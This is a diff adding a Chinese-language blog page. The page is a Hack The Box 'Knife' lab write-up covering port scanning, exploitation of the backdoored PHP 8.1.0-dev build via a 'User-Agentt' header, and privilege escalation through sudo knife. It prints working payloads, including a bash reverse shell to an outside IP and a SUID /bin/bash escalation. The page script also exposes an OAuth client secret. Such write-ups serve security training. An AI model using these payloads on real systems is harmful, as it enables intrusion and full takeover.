@@ -1,0 +1,547 @@
+<!DOCTYPE html>
+<html>
+<head>
+    
+
+    
+
+    
+
+
+
+    <!-- hexo-inject:begin --><!-- hexo-inject:end --><meta charset="utf-8">
+    
+    
+    
+    
+    <title>Knife - Hackthebox | Lucifiel&#39;s Blog | Lucifiel 技术博客</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+    
+    <meta name="theme-color" content="#3F51B5">
+    
+    
+    <meta name="keywords" content="Hackthebox">
+    <meta name="description" content="Hackthebox - Knife靶场信息  靶场类型  信息搜集Nmap首先使用nmap进行端口扫描   我们得知开启了22和80端口 出于能不爆破就不爆破的原则，先访问80端口看一下 Http  80端口上的内容有点不明所以。 在完全没思路的情况下，尝试使用dirbuster工具进行了目录爆破，但四十分钟过去了却没有一丁点收获，连robots.txt页面也不存在。 我的思路就卡在这里了，一时">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Knife - Hackthebox">
+<meta property="og:url" content="http://www.lucifiel.com/2021/05/24/Hackthebox/Hackthebox-Knife/index.html">
+<meta property="og:site_name" content="Lucifiel&#39;s Blog">
+<meta property="og:description" content="Hackthebox - Knife靶场信息  靶场类型  信息搜集Nmap首先使用nmap进行端口扫描   我们得知开启了22和80端口 出于能不爆破就不爆破的原则，先访问80端口看一下 Http  80端口上的内容有点不明所以。 在完全没思路的情况下，尝试使用dirbuster工具进行了目录爆破，但四十分钟过去了却没有一丁点收获，连robots.txt页面也不存在。 我的思路就卡在这里了，一时">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="http://www.lucifiel.com/2021/05/24/Hackthebox/Hackthebox-Knife/15ebd948-9e9e-4db2-9a0d-6b58eb00e111.png">
+<meta property="og:image" content="http://www.lucifiel.com/2021/05/24/Hackthebox/Hackthebox-Knife/a7e52db3-54c7-4bf3-99f1-f7bc84cb077f.png">
+<meta property="og:image" content="http://www.lucifiel.com/2021/05/24/Hackthebox/Hackthebox-Knife/3d61a375-a663-4661-bb80-f03b76b45a6b.png">
+<meta property="og:image" content="http://www.lucifiel.com/2021/05/24/Hackthebox/Hackthebox-Knife/a61fd32c-dfc4-4f77-a654-fc3d3564e183.png">
+<meta property="og:image" content="http://www.lucifiel.com/2021/05/24/Hackthebox/Hackthebox-Knife/6c777717-b915-411c-8527-fa96d51fb30a.png">
+<meta property="og:image" content="http://www.lucifiel.com/2021/05/24/Hackthebox/Hackthebox-Knife/1bf61095-16b8-45e5-a3ea-f032b42a3d2a.png">
+<meta property="og:image" content="http://www.lucifiel.com/2021/05/24/Hackthebox/Hackthebox-Knife/c1845bd9-d45b-4edc-a792-184423e1ad48.png">
+<meta property="og:image" content="http://www.lucifiel.com/2021/05/24/Hackthebox/Hackthebox-Knife/7f2bcd66-d61d-4353-94d6-56cee2290f49.png">
+<meta property="og:image" content="http://www.lucifiel.com/2021/05/24/Hackthebox/Hackthebox-Knife/7fef4f44-69ed-4c20-984c-42b911a65a6f.png">
+<meta property="og:image" content="http://www.lucifiel.com/2021/05/24/Hackthebox/Hackthebox-Knife/8409a9e1-ee94-4144-bcb2-64ec30da0aef.png">
+<meta property="og:image" content="http://www.lucifiel.com/2021/05/24/Hackthebox/Hackthebox-Knife/627cb565-e7cd-4608-9107-0ba62eaf3800.png">
+<meta property="og:image" content="http://www.lucifiel.com/2021/05/24/Hackthebox/Hackthebox-Knife/166415a5-7729-4898-a0c8-3dd90577ba24.png">
+<meta property="og:image" content="http://www.lucifiel.com/2021/05/24/Hackthebox/Hackthebox-Knife/9bd29c84-d31d-41c9-af25-53022c05fe37.png">
+<meta property="og:image" content="http://www.lucifiel.com/2021/05/24/Hackthebox/Hackthebox-Knife/997a63c7-c726-4518-9c9e-3f57974e4a40.png">
+<meta property="article:published_time" content="2021-05-24T11:38:36.000Z">
+<meta property="article:modified_time" content="2023-06-13T03:45:47.956Z">
+<meta property="article:author" content="Lucifiel">
+<meta property="article:tag" content="Hackthebox">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="http://www.lucifiel.com/2021/05/24/Hackthebox/Hackthebox-Knife/15ebd948-9e9e-4db2-9a0d-6b58eb00e111.png">
+    
+        <link rel="alternate" type="application/atom+xml" title="Lucifiel&#39;s Blog" href="/atom.xml">
+    
+    <link rel="shortcut icon" href="/favicon.ico">
+    <link rel="stylesheet" href="//unpkg.com/hexo-theme-material-indigo@latest/css/style.css">
+    <script>window.lazyScripts=[]</script>
+
+    <!-- custom head -->
+    
+
+<meta name="generator" content="Hexo 4.2.1"><!-- hexo-inject:begin --><!-- hexo-inject:end --></head>
+
+<body>
+    <!-- hexo-inject:begin --><!-- hexo-inject:end --><div id="loading" class="active"></div>
+
+    <aside id="menu" class="hide" >
+  <div class="inner flex-row-vertical">
+    <a href="javascript:;" class="header-icon waves-effect waves-circle waves-light" id="menu-off">
+        <i class="icon icon-lg icon-close"></i>
+    </a>
+    <div class="brand-wrap" style="background-image:url(/img/brand.jpg)">
+      <div class="brand">
+        <a href="/" class="avatar waves-effect waves-circle waves-light">
+          <img src="/img/avatar.jpg">
+        </a>
+        <hgroup class="introduce">
+          <h5 class="nickname">Lucifiel</h5>
+          <a href="mailto:LucifielHack@qq.com" title="LucifielHack@qq.com" class="mail">LucifielHack@qq.com</a>
+        </hgroup>
+      </div>
+    </div>
+    <div class="scroll-wrap flex-col">
+      <ul class="nav">
+        
+            <li class="waves-block waves-effect">
+              <a href="/"  >
+                <i class="icon icon-lg icon-home"></i>
+                主页
+              </a>
+            </li>
+        
+            <li class="waves-block waves-effect">
+              <a href="/archives"  >
+                <i class="icon icon-lg icon-archives"></i>
+                Archives
+              </a>
+            </li>
+        
+            <li class="waves-block waves-effect">
+              <a href="/tags"  >
+                <i class="icon icon-lg icon-tags"></i>
+                Tags
+              </a>
+            </li>
+        
+            <li class="waves-block waves-effect">
+              <a href="/categories"  >
+                <i class="icon icon-lg icon-th-list"></i>
+                Categories
+              </a>
+            </li>
+        
+            <li class="waves-block waves-effect">
+              <a href="https://github.com/LucifielHack" target="_blank" >
+                <i class="icon icon-lg icon-github"></i>
+                Github
+              </a>
+            </li>
+        
+            <li class="waves-block waves-effect">
+              <a href="/about"  >
+                <i class="icon icon-lg icon-user"></i>
+                About
+              </a>
+            </li>
+        
+      </ul>
+    </div>
+  </div>
+</aside>
+
+    <main id="main">
+        <header class="top-header" id="header">
+    <div class="flex-row">
+        <a href="javascript:;" class="header-icon waves-effect waves-circle waves-light on" id="menu-toggle">
+          <i class="icon icon-lg icon-navicon"></i>
+        </a>
+        <div class="flex-col header-title ellipsis">Knife - Hackthebox</div>
+        
+        <div class="search-wrap" id="search-wrap">
+            <a href="javascript:;" class="header-icon waves-effect waves-circle waves-light" id="back">
+                <i class="icon icon-lg icon-chevron-left"></i>
+            </a>
+            <input type="text" id="key" class="search-input" autocomplete="off" placeholder="输入感兴趣的关键字">
+            <a href="javascript:;" class="header-icon waves-effect waves-circle waves-light" id="search">
+                <i class="icon icon-lg icon-search"></i>
+            </a>
+        </div>
+        
+        
+        <a href="javascript:;" class="header-icon waves-effect waves-circle waves-light" id="menuShare">
+            <i class="icon icon-lg icon-share-alt"></i>
+        </a>
+        
+    </div>
+</header>
+<header class="content-header post-header">
+
+    <div class="container fade-scale">
+        <h1 class="title">Knife - Hackthebox</h1>
+        <h5 class="subtitle">
+            
+                <time datetime="2021-05-24T11:38:36.000Z" itemprop="datePublished" class="page-time">
+  2021-05-24
+</time>
+
+
+            
+        </h5>
+    </div>
+
+    
+
+
+</header>
+
+
+<div class="container body-wrap">
+    
+    <aside class="post-widget">
+        <nav class="post-toc-wrap post-toc-shrink" id="post-toc">
+            <h4>TOC</h4>
+            <ol class="post-toc"><li class="post-toc-item post-toc-level-1"><a class="post-toc-link" href="#Hackthebox-Knife"><span class="post-toc-text">Hackthebox - Knife</span></a></li><li class="post-toc-item post-toc-level-1"><a class="post-toc-link" href="#靶场信息"><span class="post-toc-text">靶场信息</span></a></li><li class="post-toc-item post-toc-level-1"><a class="post-toc-link" href="#靶场类型"><span class="post-toc-text">靶场类型</span></a></li><li class="post-toc-item post-toc-level-1"><a class="post-toc-link" href="#信息搜集"><span class="post-toc-text">信息搜集</span></a><ol class="post-toc-child"><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#Nmap"><span class="post-toc-text">Nmap</span></a></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#Http"><span class="post-toc-text">Http</span></a></li></ol></li><li class="post-toc-item post-toc-level-1"><a class="post-toc-link" href="#漏洞利用"><span class="post-toc-text">漏洞利用</span></a></li><li class="post-toc-item post-toc-level-1"><a class="post-toc-link" href="#权限提升"><span class="post-toc-text">权限提升</span></a></li></ol>
+        </nav>
+    </aside>
+
+
+<article id="post-Hackthebox/Hackthebox-Knife"
+  class="post-article article-type-post fade" itemprop="blogPost">
+
+    <div class="post-card">
+        <h1 class="post-card-title">Knife - Hackthebox</h1>
+        <div class="post-meta">
+            <time class="post-time" title="2021-05-24 19:38:36" datetime="2021-05-24T11:38:36.000Z"  itemprop="datePublished">2021-05-24</time>
+
+            
+
+
+            
+<span id="busuanzi_container_page_pv" title="文章总阅读量" style='display:none'>
+    <i class="icon icon-eye icon-pr"></i><span id="busuanzi_value_page_pv"></span>
+</span>
+
+
+        </div>
+        <div class="post-content" id="post-content" itemprop="postContent">
+            <h1 id="Hackthebox-Knife"><a href="#Hackthebox-Knife" class="headerlink" title="Hackthebox - Knife"></a>Hackthebox - Knife</h1><h1 id="靶场信息"><a href="#靶场信息" class="headerlink" title="靶场信息"></a>靶场信息</h1><img src="/2021/05/24/Hackthebox/Hackthebox-Knife/15ebd948-9e9e-4db2-9a0d-6b58eb00e111.png" class>
+
+<h1 id="靶场类型"><a href="#靶场类型" class="headerlink" title="靶场类型"></a>靶场类型</h1><img src="/2021/05/24/Hackthebox/Hackthebox-Knife/a7e52db3-54c7-4bf3-99f1-f7bc84cb077f.png" class>
+
+<h1 id="信息搜集"><a href="#信息搜集" class="headerlink" title="信息搜集"></a>信息搜集</h1><h2 id="Nmap"><a href="#Nmap" class="headerlink" title="Nmap"></a>Nmap</h2><p>首先使用nmap进行端口扫描</p>
+<img src="/2021/05/24/Hackthebox/Hackthebox-Knife/3d61a375-a663-4661-bb80-f03b76b45a6b.png" class>
+
+<p>我们得知开启了22和80端口</p>
+<p>出于能不爆破就不爆破的原则，先访问80端口看一下</p>
+<h2 id="Http"><a href="#Http" class="headerlink" title="Http"></a>Http</h2><img src="/2021/05/24/Hackthebox/Hackthebox-Knife/a61fd32c-dfc4-4f77-a654-fc3d3564e183.png" class>
+
+<p>80端口上的内容有点不明所以。</p>
+<p>在完全没思路的情况下，尝试使用dirbuster工具进行了目录爆破，但四十分钟过去了却没有一丁点收获，连robots.txt页面也不存在。</p>
+<p>我的思路就卡在这里了，一时之间不知道应该怎么做，就去泡了杯茶，突然来了灵感，要不先抓个包看看？</p>
+<img src="/2021/05/24/Hackthebox/Hackthebox-Knife/6c777717-b915-411c-8527-fa96d51fb30a.png" class>
+
+<p>乍一看似乎没有什么值得关注的东西，但在通宵日靶场导致神志不清又经过了茶叶洗礼的脑瓜子的引导下，我注意到了一个点。</p>
+<pre><code class="cpp">X-Powered-By: PHP/8.1.0-dev
+</code></pre>
+<p>这东西，隐约之间觉得不简单，便去百度进行了搜索。搜索的同时尝试了nikto工具，也提示了这一条</p>
+<img src="/2021/05/24/Hackthebox/Hackthebox-Knife/1bf61095-16b8-45e5-a3ea-f032b42a3d2a.png" class>
+
+<p>就是这两个提示，让我确信突破口在这，然后经过大量的google和百度搜索后，找到了一丝思路。</p>
+<p>PHP 8.1.0-dev 版本在2021年3月28日被植入后门，但是后门很快被发现并清除。当服务器存在该后门时，攻击者可以通过发送User-Agentt头来执行任意代码。</p>
+<h1 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h1><img src="/2021/05/24/Hackthebox/Hackthebox-Knife/c1845bd9-d45b-4edc-a792-184423e1ad48.png" class>
+
+<p>使用burp抓包，并加入字段</p>
+<pre><code class="cpp">User-Agentt: zerodiumvar_dump(2*3);
+</code></pre>
+<p>发现被成功执行</p>
+<p>接着尝试命令是否可被解析执行</p>
+<pre><code class="cpp">User-Agentt: zerodiumsystem(&quot;id&quot;);
+</code></pre>
+<img src="/2021/05/24/Hackthebox/Hackthebox-Knife/7f2bcd66-d61d-4353-94d6-56cee2290f49.png" class>
+
+<p>Nice 命令可被执行，那就简单了，可以执行命令，那就尝试getshell吧</p>
+<p>本地监听：</p>
+<pre><code class="cpp">Nc –nvlp 9001
+</code></pre>
+<p>执行命令：</p>
+<pre><code class="cpp">User-Agentt: zerodiumsystem(&quot;/bin/bash -c &#39;bash -i &gt;&amp;/dev/tcp/10.10.14.240/9001 0&gt;&amp;1&#39;&quot;);
+</code></pre>
+<img src="/2021/05/24/Hackthebox/Hackthebox-Knife/7fef4f44-69ed-4c20-984c-42b911a65a6f.png" class>
+
+<p>成功通过nc获得了一个shell</p>
+<p>首先确定是否有python</p>
+<pre><code class="cpp">Which python3
+</code></pre>
+<img src="/2021/05/24/Hackthebox/Hackthebox-Knife/8409a9e1-ee94-4144-bcb2-64ec30da0aef.png" class>
+
+<p>确定python3存在，使用python3获得一个交互式 shell 程序</p>
+<pre><code class="cpp">python3 -c &#39;import pty; pty.spawn(&quot;/bin/bash&quot;)&#39;
+</code></pre>
+<img src="/2021/05/24/Hackthebox/Hackthebox-Knife/627cb565-e7cd-4608-9107-0ba62eaf3800.png" class>
+
+<p>成功获得普通用户的flag</p>
+<h1 id="权限提升"><a href="#权限提升" class="headerlink" title="权限提升"></a>权限提升</h1><p>先确定knife用户的sudo权限</p>
+<pre><code class="bash">Sudo –l
+Ls –al /usr/bin/knife
+</code></pre>
+<img src="/2021/05/24/Hackthebox/Hackthebox-Knife/166415a5-7729-4898-a0c8-3dd90577ba24.png" class>
+
+<p>进行提权</p>
+<pre><code class="bash">echo &quot;system(&#39;chmod +s /bin/bash&#39;)&quot; &gt; exploit.rb
+ls
+sudo /usr/bin/knife exec exploit.rb
+ls -al /bin/bash
+/bin/bash –p
+</code></pre>
+<img src="/2021/05/24/Hackthebox/Hackthebox-Knife/9bd29c84-d31d-41c9-af25-53022c05fe37.png" class>
+
+<p>获得root用户的flag</p>
+<img src="/2021/05/24/Hackthebox/Hackthebox-Knife/997a63c7-c726-4518-9c9e-3f57974e4a40.png" class>
+        </div>
+
+        <blockquote class="post-copyright">
+    
+    <footer>
+        <a href="http://www.lucifiel.com">
+            <img src="/img/avatar.jpg" alt="Lucifiel">
+            Lucifiel
+        </a>
+    </footer>
+</blockquote>
+
+        
+
+
+        <div class="post-footer">
+            
+	<ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/Hackthebox/" rel="tag">Hackthebox</a></li></ul>
+
+
+            
+<div class="page-share-wrap">
+    
+
+<div class="page-share" id="pageShare">
+    <ul class="reset share-icons">
+      <li>
+        <a class="weibo share-sns" target="_blank" href="http://service.weibo.com/share/share.php?url=http://www.lucifiel.com/2021/05/24/Hackthebox/Hackthebox-Knife/&title=《Knife - Hackthebox》 — Lucifiel's Blog&pic=http://www.lucifiel.com/img/avatar.jpg" data-title="微博">
+          <i class="icon icon-weibo"></i>
+        </a>
+      </li>
+      <li>
+        <a class="weixin share-sns wxFab" href="javascript:;" data-title="微信">
+          <i class="icon icon-weixin"></i>
+        </a>
+      </li>
+      <li>
+        <a class="qq share-sns" target="_blank" href="http://connect.qq.com/widget/shareqq/index.html?url=http://www.lucifiel.com/2021/05/24/Hackthebox/Hackthebox-Knife/&title=《Knife - Hackthebox》 — Lucifiel's Blog&source=Lucifiel 技术博客" data-title=" QQ">
+          <i class="icon icon-qq"></i>
+        </a>
+      </li>
+      <li>
+        <a class="facebook share-sns" target="_blank" href="https://www.facebook.com/sharer/sharer.php?u=http://www.lucifiel.com/2021/05/24/Hackthebox/Hackthebox-Knife/" data-title=" Facebook">
+          <i class="icon icon-facebook"></i>
+        </a>
+      </li>
+      <li>
+        <a class="twitter share-sns" target="_blank" href="https://twitter.com/intent/tweet?text=《Knife - Hackthebox》 — Lucifiel's Blog&url=http://www.lucifiel.com/2021/05/24/Hackthebox/Hackthebox-Knife/&via=http://www.lucifiel.com" data-title=" Twitter">
+          <i class="icon icon-twitter"></i>
+        </a>
+      </li>
+      <li>
+        <a class="google share-sns" target="_blank" href="https://plus.google.com/share?url=http://www.lucifiel.com/2021/05/24/Hackthebox/Hackthebox-Knife/" data-title=" Google+">
+          <i class="icon icon-google-plus"></i>
+        </a>
+      </li>
+    </ul>
+ </div>
+
+
+
+    <a href="javascript:;" id="shareFab" class="page-share-fab waves-effect waves-circle">
+        <i class="icon icon-share-alt icon-lg"></i>
+    </a>
+</div>
+
+
+
+        </div>
+    </div>
+
+    
+<nav class="post-nav flex-row flex-justify-between">
+  
+    <div class="waves-block waves-effect prev">
+      <a href="/2021/05/26/Hackthebox/Hackthebox-Love/" id="post-prev" class="post-nav-link">
+        <div class="tips"><i class="icon icon-angle-left icon-lg icon-pr"></i> Prev</div>
+        <h4 class="title">Love - Hackthebox</h4>
+      </a>
+    </div>
+  
+
+  
+    <div class="waves-block waves-effect next">
+      <a href="/2021/05/24/Hackthebox/Hackthebox-ScriptKiddie/" id="post-next" class="post-nav-link">
+        <div class="tips">Next <i class="icon icon-angle-right icon-lg icon-pl"></i></div>
+        <h4 class="title">ScriptKiddie - Hackthebox</h4>
+      </a>
+    </div>
+  
+</nav>
+
+
+
+    
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+<section class="comments" id="comments">
+    <div id="gitalk-container"></div>
+    <link rel="stylesheet" href="https://unpkg.com/gitalk/dist/gitalk.css">
+    <script src="https://unpkg.com/gitalk/dist/gitalk.min.js"></script>
+    <script>
+        var id = location.pathname
+        if (location.pathname.length > 50) {
+          id = location.pathname.replace(/\/\d+\/\d+\/\d+\//, '').replace('/', '').substring(0, 50)
+        }
+        const gitalk = new Gitalk({
+          clientID: 'cf0a9809323df14a9168',
+          clientSecret: 'a30d7a21bf6d88b7ad5c1f5d1bfc45881c49b2ed',
+          repo: 'LucifielHack.github.io',
+          owner: 'LucifielHack',
+          admin: ['LucifielHack'],
+          id: id,      // Ensure uniqueness and length less than 50
+          title: document.title.split('|')[0],
+          distractionFreeMode: false  // Facebook-like distraction free mode
+        })
+
+        gitalk.render('gitalk-container')
+    </script>
+</section>
+
+
+
+
+</article>
+
+
+
+</div>
+
+        <footer class="footer">
+    <div class="top">
+        
+<p>
+    <span id="busuanzi_container_site_uv" style='display:none'>
+        站点总访客数：<span id="busuanzi_value_site_uv"></span>
+    </span>
+    <span id="busuanzi_container_site_pv" style='display:none'>
+        站点总访问量：<span id="busuanzi_value_site_pv"></span>
+    </span>
+</p>
+
+
+        <p>
+            <!--- 
+                <span><a href="/atom.xml" target="_blank" class="rss" title="rss"><i class="icon icon-lg icon-rss"></i></a></span>
+            
+            <span>footer.license</span> --->
+        </p>
+    </div>
+    <div class="bottom">
+        <p><span>Lucifiel &copy; 2020 - 2023</span>
+            <span>
+                
+                Power by Lucifiel</a>
+            </span>
+        </p>
+    </div>
+</footer>
+
+    </main>
+    <div class="mask" id="mask"></div>
+<a href="javascript:;" id="gotop" class="waves-effect waves-circle waves-light"><span class="icon icon-lg icon-chevron-up"></span></a>
+
+
+
+<div class="global-share" id="globalShare">
+    <ul class="reset share-icons">
+      <li>
+        <a class="weibo share-sns" target="_blank" href="http://service.weibo.com/share/share.php?url=http://www.lucifiel.com/2021/05/24/Hackthebox/Hackthebox-Knife/&title=《Knife - Hackthebox》 — Lucifiel's Blog&pic=http://www.lucifiel.com/img/avatar.jpg" data-title="微博">
+          <i class="icon icon-weibo"></i>
+        </a>
+      </li>
+      <li>
+        <a class="weixin share-sns wxFab" href="javascript:;" data-title="微信">
+          <i class="icon icon-weixin"></i>
+        </a>
+      </li>
+      <li>
+        <a class="qq share-sns" target="_blank" href="http://connect.qq.com/widget/shareqq/index.html?url=http://www.lucifiel.com/2021/05/24/Hackthebox/Hackthebox-Knife/&title=《Knife - Hackthebox》 — Lucifiel's Blog&source=Lucifiel 技术博客" data-title=" QQ">
+          <i class="icon icon-qq"></i>
+        </a>
+      </li>
+      <li>
+        <a class="facebook share-sns" target="_blank" href="https://www.facebook.com/sharer/sharer.php?u=http://www.lucifiel.com/2021/05/24/Hackthebox/Hackthebox-Knife/" data-title=" Facebook">
+          <i class="icon icon-facebook"></i>
+        </a>
+      </li>
+      <li>
+        <a class="twitter share-sns" target="_blank" href="https://twitter.com/intent/tweet?text=《Knife - Hackthebox》 — Lucifiel's Blog&url=http://www.lucifiel.com/2021/05/24/Hackthebox/Hackthebox-Knife/&via=http://www.lucifiel.com" data-title=" Twitter">
+          <i class="icon icon-twitter"></i>
+        </a>
+      </li>
+      <li>
+        <a class="google share-sns" target="_blank" href="https://plus.google.com/share?url=http://www.lucifiel.com/2021/05/24/Hackthebox/Hackthebox-Knife/" data-title=" Google+">
+          <i class="icon icon-google-plus"></i>
+        </a>
+      </li>
+    </ul>
+ </div>
+
+
+<div class="page-modal wx-share" id="wxShare">
+    <a class="close" href="javascript:;"><i class="icon icon-close"></i></a>
+    <p>扫一扫，分享到微信</p>
+    <img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAN4AAADeCAAAAAB3DOFrAAACsElEQVR42u3awU4rMQwF0P7/T4P0VixouddOCk86s6qYkvGZSrHl+PGIr49/1+vPz76fr/bsm1+vx40LDw8PbxT6syvhvQ6ivZvHkDwdDw8P7x5vtn3nobeJJH/FP1jw8PDwfpWXbNPtyvmLwMPDw/sfea+TQVTgLsLFw8PD+2u8pBGQFNB5CZ78VxsPHh4e3nt4pw7A3vn5F8738PDw8OLDp2RrnpXgs8RQxImHh4d3gfe6CZvst3mLNkk5LThKGHh4eHhv5J0ah9ofoa0GFPDw8PCO8trC92z5uxnMSiLEw8PDu8fbNwvyu/mBVvtfRRsXDw8Pb8E71QLIi+O2vM6fEv2SeHh4eGveLDHk1P2IatuV/aYZgYeHh3eUlxemeYPgVNB5Yb06r8PDw8Mb8do5z9lAwKzhm69ZfBMPDw9vwWvbo22DNU8t+8GCb/6Ch4eHd4HXHmvNBgv2q7Wx4eHh4d3jzY7h85L3/YMI0UwZHh4e3oI3ayvkQwb5EFWyzizN4OHh4d3gtU3STWt1FnQ7dlD/hnh4eHgx71SjoX6X5fDBbCwMDw8P7wav3e7zEjkvuGfNiE0zBQ8PD2/Dy9sEeWnbjiNsxrB+YOPh4eFd4O2PppLHt2V0OwRWl9F4eHh4a157TNWWtnlwbfIoCms8PDy8o7ykXZsPYM3W2SSSYgk8PDy8Q7zZRjwbnDqbQiIRHh4e3ht5bUpItvJ9i7aOCg8PD+8o76O88pZuvtHnW3+bYPDw8PBu8GbtgH1Am4OxJJ5VtwMPDw8v4M2Swb4gbu/Oxrnw8PDw7vGSbXrTaEi29U0Gw8PDw/vLvM3ddltvD+fq8z08PDy8y7y8LdvuzHl6uFhS4+Hh4V1oRmweljeC2xGrYpoADw8P7xDv1AHY/vW1SWjfwsDDw8MreZ9/KpKXwHWLpwAAAABJRU5ErkJggg==" alt="微信分享二维码">
+</div>
+
+
+
+
+    <script src="//cdn.bootcss.com/node-waves/0.7.4/waves.min.js"></script>
+<script>
+var BLOG = { ROOT: '/', SHARE: true, REWARD: false };
+
+
+</script>
+
+<script src="//unpkg.com/hexo-theme-material-indigo@latest/js/main.min.js"></script>
+
+
+<div class="search-panel" id="search-panel">
+    <ul class="search-result" id="search-result"></ul>
+</div>
+<template id="search-tpl">
+<li class="item">
+    <a href="{path}" class="waves-block waves-effect">
+        <div class="title ellipsis" title="{title}">{title}</div>
+        <div class="flex-row flex-middle">
+            <div class="tags ellipsis">
+                {tags}
+            </div>
+            <time class="flex-col time">{date}</time>
+        </div>
+    </a>
+</li>
+</template>
+
+<script src="//unpkg.com/hexo-theme-material-indigo@latest/js/search.min.js" async></script>
+
+
+
+
+
+
+<script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script><!-- hexo-inject:begin --><!-- hexo-inject:end -->
+
+
+
+
+
+</body>
+</html>
